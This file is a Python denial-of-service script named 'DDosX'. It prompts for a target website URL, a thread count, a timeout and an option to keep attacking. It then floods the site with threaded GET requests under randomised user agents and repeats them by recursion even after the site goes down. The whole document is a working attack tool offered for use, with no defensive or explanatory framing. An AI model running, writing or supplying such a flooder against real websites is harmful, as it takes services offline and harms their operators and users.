from os import X_OK
from colorama import init
from colorama import Fore, Back, Style
import requests
import random
import threading

text_url = input("$DDosX >>> | Website URL (http://website.com): ")
url = str(text_url)
text_threads = input("$DDosX >>> | Threads: ")
threads = int(text_threads)
text_timeout = input("$DDosX >>> | Timeout: ")
timeout = int(text_timeout)
text_keepattack = input(
    "$DDosX >>> | Keep Attack ?(Keep sending requestes even if the site is down | Default: False): ")
keepAttack = str(text_keepattack)
print(Fore.GREEN + "$DDosX >>> | Attack has been started for: " + url)

downMsgSent = False


def Attack():


 try:
    userAgent = getRandomUserAgent()
    headers = {'user-agent': userAgent}
    x = requests.get(url, headers=headers, timeout=timeout)
    if(x.status_code == 200):
        if(keepAttack == True or keepAttack == "True" or keepAttack == "true" or keepAttack == "yes" or keepAttack == "on" or keepAttack == "enable" or keepAttack == "y"):
            Attack()
 except:
        if(keepAttack == True or keepAttack == "True" or keepAttack == "true" or keepAttack == "yes" or keepAttack == "on" or keepAttack == "enable" or keepAttack == "y"):
            Attack()
            


def getRandomUserAgent():

    useragents = open('useragents.txt').read().splitlines()
    useragent = random.choice(useragents)
    return useragent


totalThr = []
for i in range(threads):
    thr = threading.Thread(target=Attack)
    thr.start()
    totalThr.append(thr)



for cThr in totalThr:
    cThr.join()
